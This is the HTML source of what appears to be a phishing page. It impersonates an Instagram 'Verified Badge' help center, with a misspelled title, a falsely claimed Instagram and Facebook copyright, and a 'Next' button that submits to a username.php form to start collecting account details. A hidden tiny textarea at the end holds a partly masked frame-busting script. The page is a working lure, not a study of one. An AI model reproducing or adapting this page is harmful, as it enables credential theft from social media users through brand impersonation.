<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verifed | Help Center</title>
<link rel="icon" href="https://resimag.com/p1/1101a46d2a3.jpeg">
<style>
#header{
  width: 100%;
  text-align: center;
  padding-top: 20px;
  position: fixed;
  background-color: #ffffff;
  top: 0px;
  left: 0px;
  height: 70px;
  border-bottom: 2px solid #dbdbdb;
}
#header img{
  width: 200px;
}
#copyright{
color:#999;}
#menu{


width:91%;
} 

#liste{ display:inline-block;} #link{text-decoration:none; color:#003569; font-family:sans-serif; font-size:13px; font-weight:540; vertical-align: baseline; } 
#asdxyz{
background-color:white;
width:91%;
margin-top: 100px;
padding-bottom: 50px;
}
#erhanasd{
font-family:sans-serif;
font-weight:400;
letter-spacing:;
color:#3d3d3d;
font-size: 20px;}
#qenzyne{
width:80%;
color:#999;
font-family:sans-serif;
}
#nick{
width: 280px;
  font-size: 15px;
  border: 1px solid #f4f4f4;
  background: #FAFAFA;
  padding: 9px 0 7px 8px;
  line-height: 18px;
}

#butonbey{
color:white;
background-color:#3897f0;
font-size:17px;

border-radius:5px;
outline:none;
font-family:sans-serif;
font-weight:540;
border:0;
width:250px;
height:30px;
font-weight:bold;

}
#nick:hover{

    border:1px solid #cecece;
    width:310px;
    max-width:80%;

}
</style>
</head>     

<body>
<div id="header"> 
   <img src="https://i.imgyukle.com/2020/06/06/yFzPFU.png"> 
  </div> 
<body bgcolor="#fafafa">
<br>
<br>
<br>
<center>
<form method="get" action="username.php">
<div id="asdxyz" style="border:1px solid #cecece;">

<img src="https://i.imgyukle.com/2020/10/05/5ps0B6.jpg" width="120px">

    <br>
    	
<h1 id="erhanasd"> <b>Verified Badge</b> <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e4/Twitter_Verified_Badge.svg/1200px-Twitter_Verified_Badge.svg.png" width="19px"> </h1>

<p id="qenzyne">  A verified badge is a check that appears next to the name of an Instagram account in search and profile. This means that Instagram confirms that this is a real account for the public figure, famous or global brand it represents. Accounts representing well-known figures and brands are verified because they are likely to impersonate. We want to make it easy for people in the Instagram community to find the real people and brands they want to follow. Click "Next" to continue the form.</p> 
   <br>



<input type="submit" value="Next" id="butonbey" style="">

</div>
</form>

<br><br>
</div>
</center>
<center>
<br><br><br>
<div id="menu"> <li id="liste"><a href="" id="link"> ABOUT US </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link"> SUPPORT </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">PRESS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">API</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">JOBS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">PRIVACY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">TERMS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">DIRECTORY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">LANGUAGE</a> </li> </div> <br> <p id="copyright" style="font-family:sans-serif;font-weight:100;"> © 2020 INSTAGRAM AND FACEBOOK </p>
<br>

</center>

</body>
<textarea Style="width: 1px; height: 1px" Rows="1" Cols="1">

<SCRIPT LANGUAGE="Javascript">

if (parent.frames.length > 0)

parent.********.href=self.********;

</SCRIPT>
</html>

